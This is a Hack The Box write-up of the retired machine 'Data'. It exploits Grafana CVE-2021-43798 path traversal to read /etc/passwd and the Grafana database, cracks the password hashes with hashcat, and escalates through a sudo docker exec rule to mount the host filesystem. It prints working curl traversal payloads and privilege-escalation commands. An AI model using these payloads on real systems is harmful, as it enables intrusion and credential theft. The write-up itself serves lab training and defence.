---
title: "Data: Grafana Path Traversal to Container Escape"
description: "Grafana path traversal (CVE-2021-43798) extracts the application database for offline credential cracking, and a permissive docker exec sudo rule mounts the host filesystem to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - grafana
  - cve
  - container-escape
  - docker
objective: "Grafana CVE-2021-43798 LFI to credential recovery and a sudo Docker escape"
tools:
  - rustscan
  - curl
  - sqlite3
  - hashcat
  - ssh
  - docker
skill: "Web LFI, credential recovery, and container escape"
outcome: "Privileged host access"
---

## Summary

Data is a retired Hack The Box Linux machine running Grafana 8.0.0. Exploitation leverages CVE-2021-43798, an unauthenticated path traversal vulnerability in Grafana plugin asset paths, to extract the SQLite database containing password hashes. Cracked credentials provide SSH access. Privilege escalation uses a permissive sudo rule for `docker exec` to mount the host filesystem from within the Grafana container and retrieve the root flag.

## Context and Objective

The target is a Linux host exposing SSH (port 22) and Grafana (port 3000). The objective is to achieve user-level access through credential extraction, then escalate to root by abusing Docker container permissions. All IPs, credentials, and container identifiers below are replaced with role-based placeholders.

## Approach and Evidence

### Enumeration

Port scanning identifies two services:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
3000/tcp open  http    Grafana http
```

The Grafana login page discloses version 8.0.0, which falls within the affected range for CVE-2021-43798.

### CVE-2021-43798 — Grafana Path Traversal

Confirming arbitrary file read via a crafted plugin path:

```bash
curl --path-as-is \
  http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

The response includes `/etc/passwd` contents, confirming unauthenticated local file read.

The most valuable target is the Grafana SQLite database:

```bash
curl -o grafana.db --path-as-is \
  http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
```

### Grafana Database Analysis

Extracting user credentials from the `user` table:

```bash
sqlite3 grafana.db
sqlite> select login,email,password,salt from user;
```

The database contains password hashes and salts for `admin` and `boris` users. Converting to Hashcat mode 10900 format and cracking recovers the credential for `boris`:

```bash
hashcat -m 10900 grafana.hash /usr/share/wordlists/rockyou.txt
```

The cracked password is `<BORIS_SSH_PASSWORD>`.

### SSH Access

Authenticating as `boris` via SSH:

```bash
ssh boris@<TARGET_IP>
```

The `<USER_RESULT>` is available.

### Privilege Escalation — Sudo Docker Rights

Checking sudo permissions reveals:

```bash
sudo -l
```

```
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

The LFI vulnerability is reused to read the container hostname:

```bash
curl --path-as-is \
  http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../../../etc/hostname
```

Returning `<CONTAINER_ID>`.

Executing into the container as root with privileged access:

```bash
sudo /snap/bin/docker exec -u root --privileged -it <CONTAINER_ID> sh
```

From inside the container, the host filesystem is mounted:

```bash
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

The `<PRIVILEGED_RESULT>` is retrieved:

```bash
cat <PRIVILEGED_RESULT_PATH>
```

## Challenges and Decisions

The Grafana version disclosure on the login page directly identified the vulnerable version, eliminating version fingerprinting overhead. The sudo rule for `docker exec` combined with privileged container access provided a straightforward path to host filesystem access without requiring additional container escape techniques.

## Outcome

The machine was compromised through CVE-2021-43798 path traversal, credential cracking, and Docker container abuse. Both user and root flags were obtained. The attack chain demonstrates how application-level vulnerabilities can expose authentication secrets, and how misconfigured container permissions can lead to full host compromise.

## Lessons and Recommendations

- Grafana path traversal (CVE-2021-43798) reaches application secrets in `grafana.db`, not just system files like `/etc/passwd`.
- Grafana password hashes require Hashcat mode 10900 with correct salt encoding for cracking.
- Sudo access to `docker exec` is high impact when a reachable container can access host devices or filesystems.
- Container hostname disclosure through LFI enables targeting the correct container for `docker exec`.

## References

- CVE-2021-43798: Grafana plugins directory traversal
- Hashcat mode 10900: Grafana S21900 PBKDF2-SHA256
